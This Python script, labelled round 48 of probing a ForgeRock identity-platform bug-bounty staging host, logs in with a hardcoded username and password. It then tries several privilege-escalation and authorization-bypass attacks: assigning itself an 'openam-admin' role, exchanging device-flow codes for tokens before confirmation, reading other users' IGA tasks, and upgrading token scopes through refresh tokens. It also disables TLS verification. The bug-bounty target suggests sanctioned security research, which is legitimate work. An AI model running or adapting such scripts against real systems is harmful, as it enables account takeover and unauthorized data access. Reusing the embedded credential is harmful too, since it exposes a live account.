# -*- coding: utf-8 -*-
"""AIC 第四十八轮:roles POST 参数 / device 流 token 交换 / IGA tasks 深挖 /
offline_access refresh
上轮信号:POST roles 400(端点存在需参数);device/code 200(public client);
   IGA user/{id}/tasks 200 空。
本轮:
A. POST users/{id}/roles 参数变体(?_action / body / query)
B. device 流:发起(带 fr:idm:* scope)-> 立即换 token(未确认状态?)
C. IGA tasks:?_action=search / 分页 / 是否返回他人数据
D. authorize scope=openid offline_access -> refresh_token -> scope 升级
预期结果表:
  成立 -> roles 可写;device 未确认即发 token;tasks 含他人数据;refresh 可升级 scope
"""
import requests, urllib3, json, time, base64
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

def jwt_scope(at):
    try:
        p = at.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p)).get('scope')
    except Exception:
        return '?'

def authz(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    if 'code=' in loc:
        return loc.split('code=')[1].split('&')[0]
    return None

print('\n=== A. POST roles 参数变体 ===')
U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID
variants = [
    ('POST', U + '/roles?_action=assign', None),
    ('POST', U + '/roles?_action=create', None),
    ('POST', U + '/roles', {'role': 'openam-admin'}),
    ('POST', U + '/roles', ['openam-admin']),
    ('POST', U + '/roles?role=openam-admin', None),
    ('PUT', U + '/roles?_action=assign', None),
]
for m, u, b in variants:
    try:
        r = S.request(m, u, json=b, timeout=12, verify=False)
        print('%s %-80s -> %d %s' % (m, u.split('.com')[1][:80], r.status_code, r.text[:130].replace('\n', ' ')))
    except Exception as e:
        print('%s -> ERR %s' % (u.split('.com')[1][:60], str(e)[:60]))
    time.sleep(0.4)

print('\n=== B. device 流 ===')
for sc in ['openid', 'openid fr:idm:*', 'fr:idm:*']:
    r = S.post(BASE + '/am/oauth2/realms/alpha/device/code',
               data={'client_id': 'endUserUIClient', 'scope': sc}, headers=FORM, timeout=12, verify=False)
    j = r.json()
    dc = j.get('device_code', '')
    print('device 发起 scope=%-18s -> %d user_code=%s device_code=%s' % (
        sc, r.status_code, j.get('user_code'), dc[:25]))
    if dc:
        r2 = S.post(TOKEN_EP, data={'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                                    'device_code': dc, 'client_id': 'endUserUIClient'},
                    headers=FORM, timeout=12, verify=False)
        t = r2.json()
        print('  立即换 token -> %d %s' % (r2.status_code,
              (('SCOPE=' + str(jwt_scope(t.get('access_token')))) if r2.status_code == 200
               else t.get('error_description', '')[:80])))
        r3 = S.post(TOKEN_EP, data={'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                                    'device_code': dc, 'client_id': 'other-client'},
                    headers=FORM, timeout=12, verify=False)
        print('  换 client 交换 -> %d %s' % (r3.status_code, r3.text[:120].replace('\n', ' ')))
    time.sleep(0.5)

print('\n=== C. IGA tasks 深挖 ===')
code = authz('openid fr:iga:*')
if code:
    r = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                               'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    at = r.json().get('access_token')
    H = {'Authorization': 'Bearer ' + at, 'Accept-API-Version': 'resource=2.1, protocol=1.0'}
    for u in ['/iga/governance/user/%s/tasks' % MY_ID,
              '/iga/governance/user/%s/tasks?_action=search' % MY_ID,
              '/iga/governance/user/%s/tasks?_queryFilter=true' % MY_ID,
              '/iga/governance/tasks',
              '/iga/governance/tasks?_action=search']:
        try:
            r = S.get(BASE + u, headers=H, timeout=12, verify=False)
            print('%-70s -> %d %s' % (u.split('.com')[1][:70], r.status_code, r.text[:120].replace('\n', ' ')))
        except Exception as e:
            print('%s -> ERR %s' % (u[:60], str(e)[:60]))
        time.sleep(0.4)

print('\n=== D. offline_access refresh ===')
code = authz('openid offline_access')
print('authorize(offline_access): code=%s' % bool(code))
if code:
    r = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                               'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    j = r.json()
    rt = j.get('refresh_token')
    print('token: scope=%s refresh=%s' % (jwt_scope(j.get('access_token')), bool(rt)))
    if rt:
        for sc in ['openid fr:idm:*', 'openid fr:iga:*']:
            r2 = S.post(TOKEN_EP, data={'grant_type': 'refresh_token', 'refresh_token': rt,
                                        'client_id': 'endUserUIClient', 'scope': sc},
                        headers=FORM, timeout=12, verify=False)
            t = r2.json()
            print('refresh scope=%-16s -> %d scope=%s' % (sc, r2.status_code,
                  jwt_scope(t.get('access_token')) if r2.status_code == 200
                  else t.get('error_description', '')[:80]))
            time.sleep(0.4)
